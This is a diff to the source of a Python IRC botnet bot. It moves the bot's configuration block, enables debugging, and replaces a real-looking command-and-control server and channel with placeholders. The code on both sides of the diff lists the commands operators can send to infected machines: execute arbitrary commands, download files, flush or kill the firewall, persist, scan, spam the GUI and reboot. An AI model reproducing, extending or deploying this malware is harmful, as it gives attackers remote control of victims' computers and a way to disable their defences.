@@ -26,6 +26,7 @@ from sys import argv
 from random import randint
 import getpass
 
+
 def generateNick(operatingSystem): #generates a nick for the server
 	if operatingSystem == "":
 		operatingSystem = "unk"
@@ -340,59 +341,6 @@ def runFunction(cmd):
 	else: #if not recognized
 		print "command '%s' not defined" % cmd
 
-#debugger
-DEBUG = 0
-if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
-	DEBUG = 1
-
-#other vars
-if argv[0][:2] == "./": #if we used ./ to run it, then get rid of those two characters
-	argv[0] = argv[0][2:]
-operatingSystem = platform.system().lower() #detected os in all lowercase
-INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
-						#index two is the boolean for if the interactive shell is with this bot
-						#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
-
-#IRC Settings
-admins = ["king", "samorizu", "blackbear", "bigshebang"]
-server = "leagueachieve.info"
-port = 6667
-channel = "#lobby"
-nick = generateNick(operatingSystem)
-
-print "The botnick is: '%s'" % nick
-
-#dictionary of functions that DO NOT take parameters
-commands = {
-	"are you there" : reply,
-	"how are you" : iAmGood,
-	"who are you" : whoAmI,
-	"how old are you" : getAge,
-	"zombie apocalypse" : terminate,
-	"terminate" : terminate,
-	"free" : freeSpace,
-	"uptime" : uptime,
-	"kernel" : kernel,
-	"version" : version,
-	"what is your ip" : getIP,
-	"where are you" : getIP,
-	"flush firewall" : flushFirewall,
-	"firewall" : checkFirewall,
-	"kill firewall" : killFirewall,
-	"nyanmbr" : nyanmbr,
-	"take a nap": nap,
-	"reboot" : reboot,
-	"persist" : persist
-}
-
-#dictionary of functions that DO take parameters
-commandsParams = {
-	"execute" : execute,
-	"download" : download,
-	"guispam" : guiSpam,
-	"admin" : admin,
-	"scan" : scanner
-}
 
 #function which parses the command and determines how to handle it
 def parseCommand(command):
@@ -536,6 +484,62 @@ def connectToServer(nick):
 	else:
 		return nick
 
+		
+#debugger
+DEBUG = 1
+if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
+	DEBUG = 1
+
+#other vars
+if argv[0][:2] == "./": #if we used ./ to run it, then get rid of those two characters
+	argv[0] = argv[0][2:]
+operatingSystem = platform.system().lower() #detected os in all lowercase
+INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
+						#index two is the boolean for if the interactive shell is with this bot
+						#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
+
+#IRC Settings
+admins = ["king", "blackbear", "bigshebang"]
+server = "serverhere"
+port = 6667
+channel = "#channelhere"
+nick = generateNick(operatingSystem)
+
+print "The botnick is: '%s'" % nick
+
+#dictionary of functions that DO NOT take parameters
+commands = {
+	"are you there" : reply,
+	"how are you" : iAmGood,
+	"who are you" : whoAmI,
+	"how old are you" : getAge,
+	"zombie apocalypse" : terminate,
+	"terminate" : terminate,
+	"free" : freeSpace,
+	"uptime" : uptime,
+	"kernel" : kernel,
+	"version" : version,
+	"what is your ip" : getIP,
+	"where are you" : getIP,
+	"flush firewall" : flushFirewall,
+	"firewall" : checkFirewall,
+	"kill firewall" : killFirewall,
+	"nyanmbr" : nyanmbr,
+	"take a nap": nap,
+	"reboot" : reboot,
+	"persist" : persist
+}
+
+#dictionary of functions that DO take parameters
+commandsParams = {
+	"execute" : execute,
+	"download" : download,
+	"guispam" : guiSpam,
+	"admin" : admin,
+	"scan" : scanner
+}		
+
+#setting up the sockets
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
 nick = connectToServer(nick) #connect to IRC server
 
